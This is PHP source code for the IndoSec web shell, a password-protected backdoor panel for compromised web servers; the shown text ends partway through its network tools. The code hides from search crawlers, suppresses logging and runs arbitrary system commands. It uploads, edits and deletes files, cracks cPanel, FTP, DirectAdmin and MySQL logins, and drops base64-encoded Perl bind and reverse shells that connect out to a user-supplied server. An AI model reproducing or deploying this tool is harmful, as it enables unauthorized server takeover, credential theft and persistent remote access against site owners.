<?php

/*
	* Konsep Shell : Brillyan -Founder { IndoSec }-
	* Pembuat : Rizsyad AR - { IndoSec }
	
	* Re-Code Boleh Asal Dah Izin Sama Pembuat, Ganti Author & Re-Code Tanpa Seizin Pembuat... Fix Lo Noob Anjenk
	* Klo Kga Bisa Bikin Cek Chanel IndoSec, Ada Tutornya, Jangan Cuma Bisa Ganti Author Doank Bangsad
	

	* Thanks For All Member { IndoSec }, Yang Telah Membantu Proses Pembuatan Shell,Dan Dari Shell Lain Untuk Inspirasinya

	* { IndoSec sHell }
	* @2022 { IndoSec } -Rizsyad AR-
	* Nb: shell ini blm sepenuhnya selesai, jadi kalau menemukan error/tampilan tidak bagus/tidak responsive harap dimaklumi.  V 0.1
*/

if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

session_start();
error_reporting(0);
@set_time_limit(0);
@ignore_user_abort(0);
@clearstatcache();


if (@function_exists('ini_set')) {
	@ini_set('error_log', NULL);
	@ini_set('log_errors', 0);
	@ini_set('max_execution_time', 0);
	@ini_set('output_buffering', 0);
	@ini_set('display_errors', 0);
	@ini_set('memory_limit', '999999999M');
	@ini_set('zlib.output_compression', 'Off');
} else {
	@ini_alter('error_log', NULL);
	@ini_alter('log_errors', 0);
	@ini_alter('max_execution_time', 0);
	@ini_alter('output_buffering', 0);
	@ini_alter('display_errors', 0);
	@ini_alter('memory_limit', '999999999M');
	@ini_alter('zlib.output_compression', 'Off');
}

@ini_restore('safe_mode');
@ini_restore("safe_mode_include_dir");
@ini_restore("safe_mode_exec_dir");
@ini_restore("disable_functions");
@ini_restore("allow_url_fopen");
@ini_restore("open_basedir");

/* Configurasi */
$aupas 					= "54062f3bf6377d42b4fab7c8fedfc7da"; // IndoSec
$_SESSION["password"] 	= $aupas;
$mode					= "debug";
$BASE_URL				= $mode === "prod" ? "https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main" : "http://localhost/www/percobaan/ids-shell";

function curlRequest($url)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}

// mendapatkan content page
function getContentPage($page, $search = "", $replace = "") 
{
	global $BASE_URL;

	$url = "$BASE_URL/page/$page.html";

	$content = (curlRequest($url) ?? file_get_contents($url));

	if($search != "" && $replace != "") {
		echo str_replace($search, $replace, $content);
		return;
	}

	echo $content;
}

// mendapatkan file image
function getImageUrl($ext) 
{
	global $BASE_URL;
    return "$BASE_URL/assets/img/$ext.png";
}

function image($ext, $attr) {
	return "<img src='".getImageUrl($ext)."' onerror=\"this.src='".getImageUrl("file")."';\" $attr loading='lazy'/>";
}

function check($password)
{
    return (md5($password) === $_SESSION["password"]);
}

function download($file)
{
    @ob_clean();
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="'.basename($file).'"');
	header('Expires: 0');
	header('Cache-Control: must-revalidate');
	header('Pragma: public');
	header('Content-Length: ' . filesize($file));
	readfile($file);
	exit;
}

function w($dir,$perm)
{
    return !is_writable($dir) ? "<font color='red'>".$perm."</font>" : "<font color='lime'>".$perm."</font>";
}

function exe($cmd)
{
	$buff = '';

	if(function_exists('system'))
    {
		@ob_start();
		@system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
	} 
    elseif(function_exists('exec'))
    {
		@exec($cmd,$results);
		$buff = @join("\n",$results);
	} 
    elseif(function_exists('passthru'))
    {
		@ob_start();
		@passthru($cmd);
        $buff = @ob_get_contents();
		@ob_end_clean();
	} 
    elseif(function_exists('shell_exec'))
    {
		$buff = @shell_exec($cmd);
	}
	return $buff;
}

function perms($file)
{
	$perms = fileperms($file);
	if (($perms & 0xC000) == 0xC000){
		// Socket
		$info = 's';
	}elseif (($perms & 0xA000) == 0xA000){
		// Symbolic Link
		$info = 'l';
	}elseif (($perms & 0x8000) == 0x8000){
		// Regular
		$info = '-';
	}elseif (($perms & 0x6000) == 0x6000){
		// Block special
		$info = 'b';
	}elseif (($perms & 0x4000) == 0x4000){
		// Directory
		$info = 'd';
	}elseif (($perms & 0x2000) == 0x2000){
		// Character special
		$info = 'c';
	}elseif (($perms & 0x1000) == 0x1000){
		// FIFO pipe
        $info = 'p';
	}else{
		// Unknown
		$info = 'u';
	}

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));

	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));
		
	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));
	return $info;
}

function formatSize( $bytes ){
	$types = array( 'B', 'KB', 'MB', 'GB', 'TB' );
	for( $i = 0; $bytes >= 1024 && $i < ( count( $types ) -1 ); $bytes /= 1024, $i++ );
	return( round( $bytes, 2 )." ".$types[$i] );
}

function formatSize1( $bytes ){
	return( round( $bytes, 2 ) );
}

function ambilKata($param, $kata1, $kata2)
{
	if(strpos($param, $kata1) === FALSE) return FALSE;
	if(strpos($param, $kata2) === FALSE) return FALSE;
	$start = strpos($param, $kata1) + strlen($kata1);
	$end = strpos($param, $kata2, $start);
	$return = substr($param, $start, $end - $start);
	return $return;
}

function swall($title, $text, $type, $dir)
{
    echo "
	<script>
    Swal.fire({
        title: '$title',
        text: '$text',
        icon: '$type',
    }).then((value) => {
        window.location = '$dir';
    })
	</script>
    ";
}

function countDomain() 
{
	global $d0mains;
    if (!$d0mains) return "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";

    $count = 0;
	foreach ($d0mains as $d0main) {
		if (@strstr($d0main, "zone")){
			preg_match_all('#zone "(.*)"#', $d0main, $domains);
			flush();
			if (strlen(trim($domains[1][0])) > 2){
				flush();
				$count++;
			}
		}
	}

	return $count;
}

function login_shell()
{
	getContentPage("login");
}

function zipFile($data, $dir, $type)
{
	if(!function_exists('ZipArchive') && !extension_loaded('zip')) return false;

	$zip = new ZipArchive();

	if($type === "zip")
	{
		if(!file_exists($data)) return false;

		$data = realpath($data);
		$zip->open(basename($dir).".zip", ZIPARCHIVE::CREATE | ZipArchive::OVERWRITE);

		if(is_file($data)) $zip->addFromString(basename($data), file_get_contents($data));

		if(is_dir($data)) {
			$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($data), RecursiveIteratorIterator::SELF_FIRST);
			foreach ($files as $file) {
				$file = realpath($file);
				if(is_file($file)) {
					$zip->addFromString(str_replace($data . '/', '', $file), file_get_contents($file));
				}
			}
		}
	}
	else
	{
		$res = $zip->open($data);
		if(!$res) return false;

		$name = basename($data, ".zip")."_unzip";
		@mkdir($name);
		@$zip->extractTo($dir."/".$name);
	}

	@$zip->close();
	return true;
}

function breadcrumb($page)
{
	$li = "";
	$exclude = array("files", "mass", "tools");

	for ($i=0; $i < count($page); $i++) { 
		$pages = strtolower(preg_replace('/\s+/', '', $page[$i]));

		if($i+1 === count($page)) $li .= "<li class='active'>".$page[$i]."</li>";
		else if(in_array($pages, $exclude)) $li .= '<li><a href="#">'.$page[$i].'</a></li>';
		else $li .= '<li><a href="?page='.$pages.'">'.$page[$i].'</a></li>';
	}

	echo '<div class="breadcrumbs">
    <div class="col-sm-4">
      <div class="page-header float-left">
        <div class="page-title">
          <h1>Dashboard</h1>
        </div>
      </div>
    </div>
    <div class="col-sm-8">
      <div class="page-header float-right">
        <div class="page-title">
          <ol class="breadcrumb text-right">
            '.$li.'
          </ol>
        </div>
      </div>
    </div>
  </div>';
}

function template($page, $bc, $search, $replace)
{
	getContentPage("components/header");
	getContentPage("components/sidebar");
	getContentPage("components/rightpanel");
	breadcrumb($bc);
	getContentPage($page, $search, $replace);
	getContentPage("components/footer", $search, $replace);
}

function pages($page, $bc, $search = "", $replace = "")
{
	template($page, $bc, $search, $replace);
}

if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
	if(!isset($_POST['pass']) || !check($_POST['pass'])) return login_shell();
	$_SESSION[md5($_SERVER['HTTP_HOST'])] = TRUE;
}

if(isset($_GET['path'])){
	$path = $_GET['path'];
	chdir($path);
} else {
	$path = getcwd();
}

$path 			= @str_replace('\\','/',$path);
$paths 			= explode('/',$path);
$os 			= php_uname();
$ip 			= getHostByName(getHostName());
$ver 			= phpversion();
$web 			= $_SERVER['HTTP_HOST'];
$sof 			= $_SERVER['SERVER_SOFTWARE']; 
$curl 			= (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$mail 			= (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$sm 			= (function_exists('safe_mode')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
$zip 			= (!function_exists('ZipArchive') && !extension_loaded('zip')) ? "<font color=red>NONE</font>" :  "<font color=green>ON</font>";
$total 			= disk_total_space($path);
$free 			= disk_free_space($path);
$usage			= (formatSize1($total)-formatSize1($free));
$ds 			= @ini_get("disable_functions");
$apachemodul 	= (function_exists("apache_get_modules")) ? implode(', ', apache_get_modules()) : "<font color=red>NONE</font>";
$show_ds 		= (!empty($ds)) ? "<a href='#'>$ds</a>" : "<font color=green>NONE</font>";
$d0mains 		= @file("/etc/named.conf", false);

$supportDB = array();
if(function_exists('mysqli_get_client_info') || function_exists('mysql_get_client_info')) $supportDB[] = "MySQL / MySQLi (".mysqli_get_client_info().")";
if(function_exists('mssql_connect')) $supportDB[] = "MSSQL";
if(function_exists('pg_connect')) $supportDB[] = "PostgreSQL";
if(function_exists('oci_connect')) $supportDB[] = "Oracle";
$supportDB = implode(', ', $supportDB);

function printPath()
{
	global $paths;
	global $path;
	global $page;
	$ph = "";

	foreach($paths as $id => $pat){
		if($pat == '' && $id == 0){			
			$ph .= "<a href='?page=$page&path=/'>/</a>";
			continue;
		} if($pat == '') continue;
		$ph .= "<a style='word-wrap:break-word;' href='?page=$page&path=";
		for($i=0;$i<=$id;$i++){
			$ph .= "$paths[$i]";
			if($i != $id) $ph .= "/";
		}
		$ph .= "'>".$pat."</a>/";
	}
	$ph .= " [".w($path, perms($path))."]";

	return $ph;
}

function current_path($pages = "", $paths = ""){
	global $path;
	global $page;

	$page = $pages ? $pages : $page;
	$path = $paths ? $paths : $path;

	return "?page=$page&path=$path";
}

function isImage($name) {
	$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
	return preg_match('/(jpg|png|gif|jpeg|gif)$/i', $ext, $matches, PREG_OFFSET_CAPTURE, 0);
}

function actionMultiDelete($dir) {

	if(is_writable($dir)) {
		$paths = scandir($dir);

		foreach ($paths as $path) {
			if($path == "." || $path == "..") continue;
			$dirs = "$dir/$path";

			if(!is_dir($dirs)) @unlink($dirs);

			if(is_dir($dirs) && is_readable($dirs)) {
				@rmdir($dirs);
				@exe("rm -rf $dirs");
				@exe("rmdir /s /q $dirs");
			}
		}
		return true;
	}
	return false;
}

function curlRequestCrack($info)
{
	$options 	= array();
	$ch 		= curl_init();

	if($info["login"] == "cp") $url = $info['protocol'].$info['url'].':'.$info['port'];
	if($info["login"] == "ftp") $url = $info['protocol'].$info['url'];
	if($info["login"] == "DirectAdmin") $url = $info['protocol'].$info['url'].':'.$info['port'].'/CMD_LOGIN';
	if($info["login"] == "DirectAdminMysql") $url = $info['protocol'].$info['url'].'/phpmyadmin';

	$options["CURLOPT_URL"] = $url;
	$options["CURLOPT_USERAGENT"] = "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0";
	$options["CURLOPT_RETURNTRANSFER"] = 1;
	if($info["login"] == "ftp" || $info["login"] == "DirectAdmin" || $info["login"] == "DirectAdminMysql") {
		$options["CURLOPT_USERPWD"] = $info["username"].":".$info["password"];
	}
	if($info["login"] == "cp" || $info["login"] == "DirectAdmin" || $info["login"] == "DirectAdminMysql") {
		$options["CURLOPT_SSL_VERIFYPEER"] = 0;
		$options["CURLOPT_SSL_VERIFYHOST"] = 0;
		$options["CURLOPT_HEADER"] = 0;
		$options["CURLOPT_FOLLOWLOCATION"] = 1;
	}
	if($info["login"] == "cp") {
		$options["CURLOPT_HTTPHEADER"] = array("Authorization: Basic ". base64_encode($info["username"].":".$info["password"]));
	}
	if($info["login"] == "DirectAdminMysql") {
		$options["CURLOPT_HTTPAUTH"] = CURLAUTH_ANY;
	}
	curl_setopt_array($ch, $options);
	$result = @curl_exec($ch);
	$curl_errno = curl_errno($ch);
	$curl_error = curl_error($ch);
	curl_close($ch);

	if ($curl_errno > 0) {return "<font color='red'>Error: $curl_error</font><br>";}
	elseif(preg_match('/CMD_FILE_MANAGER|frameset/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
	elseif(preg_match('/filemanager/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
	elseif(preg_match('/(\d+):(\d+)/i',$result)){return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';}
	
}

function crackFunctionLogin($info){
	if($info["login"] == "mysqli_connect")
	{
		if(@mysqli_connect($info['url'].':'.$info['port'],$info['username'],$info['password']))
		{
			return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
		}
	} else 
	{
		if($con=@ftp_connect($info['url'],$info['port']))
		{
			if($con)
			{
				$login=@ftp_login($con,$info['username'],$info['password']);
				if($login) return 'UserName: <font color="red">'.$info['username'].'</font> PassWord: <font color="red">'.$info['password'].'</font><font color="green">  Login Success....</font><br>';
			}
		}
	}
}

function newfile(){

	global $path;

	pages("newfile", ["Files", "File Manager", "New File"]);

	if(isset($_POST["bikin"]))
	{
		$name = $_POST['nama_file'];
		$isi_file = $_POST['isi_file'];

		$handle = @fopen("$path/$name", "w");
		$buat = @fwrite($handle, $isi_file);
		if($buat) return swall("Success", "Berhasil Membuat File", "success", current_path("filemanager", $path));

		return swall("Success","Gagal Membuat File", "success", current_path("filemanager", $path));
	}
}

function newfolder(){

	global $path;

	pages("newfolder", ["Files", "File Manager", "New Folder"]);

	if(isset($_POST["bikin"]))
	{
		$name = $_POST['nama_folder'];
		$fd = @mkdir($name);
		if($fd) return swall("Success", "Berhasil Membuat File", "success", current_path("filemanager", $path));

		return swall("Success","Gagal Membuat File", "success", current_path("filemanager", $path));
	}
}

function viewfile()
{
	global $path;
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

	if(isImage($path)) {
		$content = "<br/><img src='data:image/$ext;base64,".base64_encode(@file_get_contents($path))."' class='img-fluid mt-3'  />";
	} else {
		$content = '<textarea rows="13" class="form-control mt-3" disabled="">'.htmlspecialchars(@file_get_contents($path)).'</textarea>';
	}
	
	$name = basename($path);
	$namefile = image($ext, "style='width: 25px;'")." ".$name;
	
	pages("viewfile", ["Files", "File Manager", "View File"], array("{{CONTENTFILE}}", "{{NAMEFILE}}"), array($content, $namefile));
}

function renameF()
{
	global $path;

	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
	$name = basename($path);
	$namefile = image($ext ? $ext : 'folder', "style='width: 25px;'")." ".$name;

	pages("renamefile", ["Files", "File Manager", "Rename ".($ext ? "File" : 'Folder')], array("{{NAMEFILE}}", "{{NAME}}"), array($namefile, $name));

	if(isset($_POST['rename']))
	{
		$lama = $path;
		$baru = $_POST['new'];
		
		if(is_dir($lama))
		{
			$ubah = rename($lama, dirname($lama)."/".$baru);
		}
		else
		{
			
			if(file_exists($baru)) 
			{
				$path = dirname($lama);
				return swall("Error", "Nama $baru Telah Digunakan", "error",  current_path("filemanager", $path));
			} 

			$ubah = rename($lama, $baru);
		}

		if($ubah) 
		{
			$path = dirname($lama);
			return swall("Success", "Berhasil Mengganti Nama Menjadi $baru", "success",  current_path("filemanager", $path));
		} 

		$path = dirname($lama);
		swall("Error", "Gagal Mengganti Nama", "error", current_path("filemanager", $path));
	}
}

function editF()
{
	global $path;

	$content = '<textarea rows="13" class="form-control mt-3 mb-3" name="isi">'.htmlspecialchars(@file_get_contents($path)).'</textarea>';
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
	$name = basename($path);
	$namefile = image($ext, "style='width: 25px;'")." ".$name;
	
	pages("edit", ["Files", "File Manager", "Edit File"], array("{{CONTENTFILE}}", "{{NAMEFILE}}"), array($content, $namefile));

	if(isset($_POST['edit']))
	{
		$updt = fopen($path, "w");
		$hasil = fwrite($updt, $_POST['isi']);
		if ($hasil) return swall("Success", "Berhasil Update File", "success", current_path("filemanager", dirname($path)));
		return swall("Error", "Gagal Update File", "error", current_path("filemanager", dirname($path)));
	}
}

function chmods()
{
	global $path;

	$name = basename($path);
	$ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));
	$namefile = image($ext ? $ext : 'folder', "style='width: 25px;'")." Chmod ".($ext ? "File" : 'Folder')." : ".$name;
	$perms = substr(sprintf('%o', fileperms($path)), -4);

	pages("chmod", ["Files", "File Manager", "Chmod ".($ext ? "File" : 'Folder')], array("{{FILEPERMS}}", "{{NAMEFILE}}"), array($perms, $namefile));

	if(isset($_POST['chmo'])){
		if(@chmod($path,$_POST['perm'])) return swall("Success", "Change Permission Berhasil", "success", current_path("filemanager", dirname($path)));
		return swall("Error", "Change Permission Gagal", "error", current_path("filemanager", dirname($path)));
	}
}

function upload(){
	global $path;

	$ph = printPath();
	$dir_current = current_path();

	pages("upload", ["Files", "Upload Files"], array("{{PATH}}"), array($ph));

	if(isset($_POST["upload"])) {
		$jumlah = count($_FILES['file']['name']);
		for($i=0; $i < $jumlah;$i++){
			$filename = $_FILES['file']['name'][$i];
			$up = @copy($_FILES['file']['tmp_name'][$i], "$path/".$filename);
		}
		if($jumlah > 1) return swall("Success", "Berhasil Upload $jumlah File", "success", $dir_current);
		if($up) return swall("Success", "Berhasil Upload $filename", "success", $dir_current);
		
		swall("Error", "Gagal Upload File", "error", $dir_current);
	}
}


function hapus() {
	global $path;

	pages("blank", [""]);

	if(is_dir($path) && is_readable($path) ) {
		if(@rmdir($path) || @exe("rm -rf $path") || @exe("rmdir /s /q $path")) return swall("Success", "Berhasil Menghapus", "success",  current_path("filemanager", dirname($path)));
	}

	if(unlink($path)) return swall("Success", "Berhasil Menghapus", "success",  current_path("filemanager", dirname($path)));

	return swall("Error", "Gagal Menghapus", "error",  current_path("filemanager", dirname($path)));
}

function mdelete()
{
	global $path;

	pages("massdelete", ["Mass", "Mass Delete"], array("{{PATH}}", "{{IMG}}"), array($path, image('folder', 'style="width: 25px;"')));

	if(isset($_POST["delete"]))
	{
		$spath = $_POST["d_dir"];

		if(actionMultiDelete($spath)) return swall("Success", "Berhasil Multi Menghapus", "success",  current_path("mdelete"));
		return swall("Error", "Gagal Multi Menghapus", "error",  current_path("mdelete"));
	}
}

function filemanager()
{
	global $path;
	global $page;

	$ph = printPath();
	$fm = "";

	$scandir = scandir($path);

	foreach ($scandir as $dir) {

		if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;

		$dtime = date("l d/m/y G:i", filemtime("$dir/"));

		if (strlen($dir) > 18) {
			$_dir = substr($dir, 0, 18)."...";
		} else {
			$_dir = $dir;
		}

		$fm .= "<tr>
			<td>
				".image("folder", "style='width: 25px;'")."
				<a href='?page=$page&path=$path/$dir'>$_dir</a>
			</td>
			<td>--</td>
			<td>$dtime</td>
			<td>".mime_content_type("$path/$dir")."</td>
			<td><a title='chmod' href='?page=chmod&path=$path/$dir'>".w("$path/$dir", perms("$path/$dir"))."</a></td>
			<td class='text-white d-flex'>
				<a title='Rename' class='badge badge-success ml-2' href='?page=rename&path=$path/$dir'><i class='fa fa-pen'></i></a>
				<a title='Delete' class='badge badge-danger ml-2' href='?page=delete&path=$path/$dir'><i class='fa fa-trash'></i></a>
			</td>
		</tr>";
	}

	foreach($scandir as $file) {

		if(!is_file($path.'/'.$file)) continue;

		$dtime = date("l d/m/y G:i", filemtime("$path/$file"));
		$ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));

		if (strlen($file) > 25){
			$_file = substr($file, 0, 25)."...-.".$ext;												
		} else {
			$_file = $file;
		}

		$fm .= "<tr>
			<td>
				".image($ext, "style='width: 25px;'")."
				<a href='?page=viewfile&path=$path/$file'>$_file</a>
			</td>
			<td>".formatSize(filesize($file))."</td>
			<td>$dtime</td>
			<td>".mime_content_type("$path/$file")."</td>
			<td><a title='chmod' href='?page=chmod&path=$path/$file'>".w("$path/$file", perms("$path/$file"))."</a></td>
			<td class='text-white d-flex'>
				<a title='Lihat' class='badge badge-info ml-2' href='?page=viewfile&path=$path/$file'><i class='fa fa-eye'></i></a>
				<a title='Edit' class='badge badge-success ml-2' href='?page=edit&path=$path/$file'><i class='far fa-edit'></i></a>
				<a title='Rename' class='badge badge-success ml-2' href='?page=rename&path=$path/$file'><i class='fa fa-pen'></i></a>
				<a title='Delete' class='badge badge-danger ml-2' href='?page=delete&path=$path/$file'><i class='fa fa-trash'></i></a>
				<a title='Download' class='badge badge-primary ml-2' href='?page=download&path=$path/$file'><i class='fa fa-download'></i></a>
			</td>
		</tr>";
	}

	$button = "<div class='d-flex mt-3'><a class='btn btn-primary btn-sm text-white mr-3' href='?page=newfile&path=$path'>Tambah File</a><a class='btn btn-primary btn-sm text-white mr-3' href='?page=newfolder&path=$path'>Tambah Folder</a></div>";

	pages("filemanager", ["Files", "File Manager"], array("{{PATH}}", "{{FILEMANAGER}}", "{{BUTTON}}"), array($ph, $fm, $button));
}

function downloadAdminer()
{
	$content = curlRequest("https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/includes/adminer.php");
	$fp 	= @fopen("adminer.php", "w");
	$buat 	= @fwrite($fp, $content);
	fclose($fp);
	return $buat;
}

function adminer()
{
	global $path;

	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $path);

	if (file_exists("adminer.php")) $output = "<a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
	else if (downloadAdminer()) $output = "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
	else $output = "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";

	pages("adminer", ["Tools", "Adminer"], array("{{OUTPUT}}"), array($output));
}

function backup() {
	
	global $path;

	pages("backup", ["Files", "Backup"], array("{{PATHZIP}}", "{{PATH}}"), array("$path.zip", $path));

	if(isset($_POST["upnun"])) {
		$filename 	= $_FILES["zip_file"]["name"];
		$tmp 		= $_FILES["zip_file"]["tmp_name"];

		if(!move_uploaded_file($tmp, "$path/$filename")) return swall("Error", "Gagal Upload Zip", "error", current_path("backup"));

		if(!zipFile($filename, $path, "extract")) {
			swall("Error", "Gagal Mengekstrak Zip", "error", current_path("backup"));
			unlink($filename);
			return;
		}
		
		unlink($filename);

		return swall("Success", "Success Mengekstrak Zip", "success", current_path("backup"));
	}

	if(isset($_POST["backup"])) {
		$fol = $_POST['folder'];

		if(!zipFile($fol, $fol, "zip")) return swall("Error", "Gagal Mengkompres Zip", "error", current_path("backup"));
		return swall("Success", "Success Mengkompres Zip", "success", current_path("backup"));
	}

	if(isset($_POST["extrak"])) {
		$zip = $_POST["file_zip"];

		if(!zipFile($zip, $path, "extract")) return swall("Error", "Gagal Mengekstrak Zip", "error", current_path("backup"));
		return swall("Success", "Success Mengekstrak Zip", "success", current_path("backup"));
	}

}

function dashboard() {

	global $ver;
	global $ip;
	global $supportDB;
	global $curl;
	global $mail;
	global $show_ds;
	global $sof;
	global $os;
	global $usage;
	global $apachemodul;
	global $sm;
	global $zip;
	global $free;
	global $total;

	$arrFind = [
		"{{countDomain}}", 
		"{{PHPVERSION}}", 
		"{{IPSERVER}}",
		"{{SUPPORTDB}}",
		"{{CURL}}",
		"{{MAILER}}",
		"{{DF}}",
		"{{SOFT}}",
		"{{OS}}",
		"{{FREEUSAGE}}",
		"{{USAGE}}",
		"{{TOTALUSAGE}}",
		"{{APACHE}}",
		"{{SM}}",
		"{{ZIP}}",
		"{{IPCLIENT}}"
	];

	$arrReplace = [ 
		countDomain(), 
		$ver, 
		$ip,
		$supportDB,
		$curl,
		$mail,
		$show_ds,
		$sof,
		$os." [<a href='https://www.exploit-db.com/search?q=".php_uname('s')."+Kernel+".php_uname('r')."' target='_blank' rel='noreferrer'>Exploit DB</a>] ",
		formatSize1($free),
		$usage,
		"Total: ".formatSize($total),
		$apachemodul,
		$sm,
		$zip,
		$_SERVER['REMOTE_ADDR'],
	];

	pages("dashboard", ["Dashboard"], $arrFind, $arrReplace);
}

function network() {
	pages("network", ["Tools","Network"]); 

	$server 	= $_POST["server"];
	$port 		= $_POST["port"];
	$content 	= "";
	$nameFile 	= "";
	$exe 		= "";
	$output		= "";

	if($_POST["bpl"])
	{
		$content = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
		$nameFile = "bp.pl";
		$exe = "perl bp.pl $port 1>/dev/null 2>&1 &";
	}

	if($_POST['backconnect'] == 'perl')
	{
		$content = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
		$nameFile = "bc.pl";
		$exe = "perl bc.pl $server $port 1>/dev/null 2>&1 &";
	}

	if($_POST['backconnect'] == 'python')
	{
